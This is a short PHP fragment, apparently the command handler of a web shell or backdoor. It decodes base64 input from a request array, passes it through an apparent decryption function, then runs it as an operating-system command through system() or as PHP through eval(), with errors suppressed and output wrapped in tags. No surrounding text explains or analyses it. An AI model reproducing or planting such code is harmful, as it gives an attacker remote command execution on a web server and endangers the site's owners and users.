$r[1] = c(base64_decode(str_replace(' ', '+', $r[1])), $r[0]);
echo '<'.$r[0].'>';
if($r[2]==0)@system($r[1]." 2>&1");
elseif($r[2]==1)@eval($r[1]);
echo '</'.$r[0].'>';
